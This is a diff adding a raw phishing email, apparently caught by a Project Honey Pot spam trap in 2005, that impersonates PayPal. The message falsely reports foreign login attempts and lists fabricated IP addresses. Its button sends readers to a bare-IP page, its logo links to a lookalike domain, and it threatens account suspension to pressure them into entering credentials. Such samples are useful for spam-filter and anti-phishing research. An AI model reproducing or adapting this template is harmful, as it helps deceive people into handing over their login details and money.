@@ -1,0 +1,166 @@
+Received: from 65-86-36-110.client.dsl.net (HELO server.thinkaltamira.com) (65.86.36.110)
+  by projecthoneypotmailserver with SMTP; 22 Jul 2005 03:44:13 -0000
+Received: by server.thinkaltamira.com (Postfix, from userid 0)
+	id 3EFC2370B46; Thu, 21 Jul 2005 23:44:11 -0400 (EDT)
+To: projecthoneypot@projecthoneypot.org
+Subject:  Verify your PayPal Account 
+From: accounting@paypal.com <service@paypal.com>
+Content-Type: text/html
+Message-Id: <20050722034411.3EFC2370B46@server.thinkaltamira.com>
+Date: Thu, 21 Jul 2005 23:44:11 -0400 (EDT)
+
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<table cellSpacing="0" cellPadding="0" width="600" align="center" border="0">
+  <tr vAlign="top">
+    <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+    <a href="http://www.paypal.com-cgi-bin.us/ppverify.php?cmd=_login-run&mail=&?motd=account_verify" target="_blank">
+    <img alt="PayPal" src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border="0" width="255" height="35"></a>
+    </td>
+  </tr>
+</table>
+<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+  <tr>
+    <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif" width="100%" background="http://images.paypal.com/images/bg_clk.gif">
+    <img height="29" src="http://images.paypal.com/images/pixel.gif" width="1" border="0"></td>
+  </tr>
+  <tr>
+    <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+    <img height="10" src="http://images.paypal.com/images/pixel.gif" width="1" border="0"></td>
+  </tr>
+</table>
+<table cellSpacing="0" cellPadding="0" width="600" align="center" border="0">
+  <tr vAlign="top">
+    <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif" width="400">
+    <table cellSpacing="0" cellPadding="5" width="100%" border="0">
+      <tr vAlign="top">
+        <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+        <table cellSpacing="0" cellPadding="0" width="100%" border="0">
+          <tr>
+            <td class="pp_heading" align="left"><br>
+            <b>Security Measures - Are You Traveling?</b></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+      <tr>
+        <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+        <br>
+        PayPal is committed to maintaining a safe environment for its community 
+        of buyers and sellers. To protect the security of your account, PayPal 
+        employs some of the most advanced security systems in the world and our 
+        anti-fraud teams regularly screen the PayPal system for unusual 
+        activity.<br>
+        <br>
+        We recently noted one or more attempts to log in to your account from a 
+        foreign country. If you accessed your account while traveling, the 
+        attempt(s) may have been initiated by you.<br>
+        <br>
+        Because the behavior was unusual for your account, we would like to take 
+        an extra step to ensure your security and you will now be taken through 
+        a series of identity verification pages. <br>
+        <br>
+&nbsp;<table>
+          <tr bgColor="#ccddee">
+            <td class="emphasis">&nbsp;IP Address</td>
+            <td class="emphasis">&nbsp;Time</td>
+            <td class="emphasis">&nbsp;Country</td>
+          </tr>
+          <tr bgColor="#eeeeee">
+            <td>193.23.134.158</td>
+            <td>Iul. 18, 2005 12:47:01 PDT</td>
+            <td>Romania</td>
+          </tr>
+          <tr bgColor="#ffffff">
+            <td>208.247.248.250</td>
+            <td>Iul. 7, 2005 18:37:55 PDT</td>
+            <td>Ilinois</td>
+          </tr>
+          <tr bgColor="#eeeeee">
+            <td>81.34.111.205</td>
+            <td>Iul. 8, 2005 16:42:16 PDT</td>
+            <td>France</td>
+          </tr>
+          <tr bgColor="#ffffff">
+            <td>82.35.234.11
+            <td>Iul 8, 2005 16:58:03 PDT</td>
+            <td>Rende</td>
+          </tr>
+        </table>
+        <p>&nbsp; </p>
+        <table cellSpacing="0" cellPadding="1" width="75%" align="left" bgColor="#ffe65c" border="0">
+          <tr>
+            <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+            <table cellSpacing="0" cellPadding="4" width="100%" align="center" bgColor="#fffecd" border="0">
+              <tr>
+                <td class="pp_sansserif" align="middle">
+                <a target="_blank" href="http://83.64.58.20/pay/">
+                Click here to verify your account</a></td>
+              </tr>
+            </table>
+            </td>
+          </tr>
+        </table>
+        <p><br>
+        <br>
+        <br>
+        Thank you for your prompt attention to this matter. Please understand 
+        that this is a security measure meant to help protect you and your 
+        account. <br>
+        <br>
+        We apologize for any inconvenience.<br>
+        <br>
+        If you choose to ignore our request, you leave us no choise but to 
+        temporaly suspend your account.<br>
+        <br>
+        Thank you for using PayPal! The PayPal Team </td>
+      </tr>
+      <tr>
+        <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+        <hr class="dotted"></td>
+      </tr>
+      <tr>
+        <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+        <table cellSpacing="0" cellPadding="0" width="100%" border="0">
+          <tr>
+            <td class="pp_footer">Please do not reply to this e-mail. Mail sent 
+            to this address cannot be answered. For assistance,
+            <a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_login-run">
+            log in</a> to your PayPal account and choose the &quot;Help&quot; link in the 
+            footer of any page.<br>
+            <br class="h10">
+            To receive email notifications in plain text instead of HTML, update 
+            your preferences
+            <a href="https://www.paypal.com/row/PREFS-NOTI" target="_blank">here</a>.
+            </td>
+          </tr>
+          <tr>
+            <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+            <img height="10" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" border="0"></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+      <tr>
+        <td style="font-size: 12px; color: #000000; font-family: verdana,arial,helvetica,sans-serif">
+        <br>
+        <span class="pp_footer">PayPal Email ID PP697</span></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+</body>
+
+</html>
+
